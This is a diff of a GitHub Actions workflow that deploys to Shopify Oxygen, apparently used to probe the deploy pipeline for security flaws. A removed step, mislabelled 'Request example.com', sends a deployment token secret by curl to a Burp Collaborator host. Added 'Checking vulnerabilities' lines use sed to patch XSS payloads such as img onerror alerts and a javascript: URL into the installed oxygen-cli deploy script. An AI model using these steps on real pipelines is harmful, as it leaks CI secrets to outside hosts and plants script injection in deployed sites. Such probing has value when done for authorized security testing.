@@ -43,11 +43,14 @@ jobs:
             ${{ runner.os }}-
       - name: Install dependencies
         run: npm install
-      - name: Request example.com
+
+      - name: Checking vulnerabilities
         run: |
-          TOKEN="${{ secrets.OXYGEN_DEPLOYMENT_TOKEN_1000008763 }}"
-          echo "::add-mask::$TOKEN"
-          curl -i "https://qnhsq5wfl994qdtdfsehdrzm6dc30s.burpcollaborator.net?secret=${TOKEN}"
+          sed -i "134i\description: \"<img src=x onerror=alert(document.domain)>\"," node_modules/@shopify/oxygen-cli/dist/commands/oxygen/deploy.js
+          sed -i "135i\url: \"javascript:alert(1)\"," node_modules/@shopify/oxygen-cli/dist/commands/oxygen/deploy.js
+          sed -i "136i\user: \"<img src=x onerror=alert(document.domain)>\"," node_modules/@shopify/oxygen-cli/dist/commands/oxygen/deploy.js
+          sed -i "137i\version: \"<img src=x onerror=alert(document.domain)>\"," node_modules/@shopify/oxygen-cli/dist/commands/oxygen/deploy.js
+
       - name: Check Oxygen version
         id: check_version
         shell: 'bash'
@@ -70,7 +73,7 @@ jobs:
               exit 1
             fi
           fi
-      
+
       - name: Build and Publish to Oxygen
         shell: 'bash'
         id: 'oxygen-cli-action'
@@ -83,10 +86,6 @@ jobs:
                 --assetsFolder=dist/client \
                 --workerFolder=dist/worker \
                 --verificationMaxDuration=180 \
-                --metadataUrl=https://bitbucket.org/ \
-                --metadataDescription=HuiOsla \
-                --metadataUser=TrayHard \
-                --metadataVersion=a4d7ddc6207c6c3b5c639ac1bbcde3374b0bfd07 \
                 --token=${{ steps.check_version.outputs.token }}"
 
           output=$($oxygen_command --buildCommand="${build_command_filtered}")
